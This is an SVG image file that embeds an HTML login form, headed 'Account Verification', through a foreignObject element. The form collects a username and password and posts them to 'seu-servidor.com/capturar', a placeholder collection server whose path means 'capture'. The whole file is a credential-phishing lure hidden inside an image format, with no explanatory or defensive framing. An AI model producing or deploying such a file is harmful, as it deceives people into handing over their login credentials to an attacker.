<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300">
  <rect width="400" height="300" fill="#f5f5f5" rx="10" stroke="#ccc" stroke-width="2"/>
  <foreignObject x="50" y="30" width="300" height="240">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <style>
        .login-form {
          font-family: Arial, sans-serif;
          padding: 20px;
        }
        .form-title {
          color: #333;
          font-size: 24px;
          margin-bottom: 20px;
          text-align: center;
        }
        .form-group {
          margin-bottom: 15px;
        }
        label {
          display: block;
          margin-bottom: 5px;
          color: #555;
        }
        input {
          width: 100%;
          padding: 8px;
          border: 1px solid #ddd;
          border-radius: 4px;
          box-sizing: border-box;
        }
        .submit-btn {
          background-color: #4a90e2;
          color: white;
          border: none;
          padding: 10px 15px;
          border-radius: 4px;
          cursor: pointer;
          width: 100%;
          font-size: 16px;
        }
      </style>
      <div class="login-form">
        <h2 class="form-title">Account Verification</h2>
        <form id="loginForm" method="post" action="https://seu-servidor.com/capturar">
          <div class="form-group">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required="required" autocomplete="off"/>
          </div>
          <div class="form-group">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required="required"/>
          </div>
          <button type="submit" class="submit-btn">Verify Account</button>
        </form>
      </div>
    </body>
  </foreignObject>
</svg>
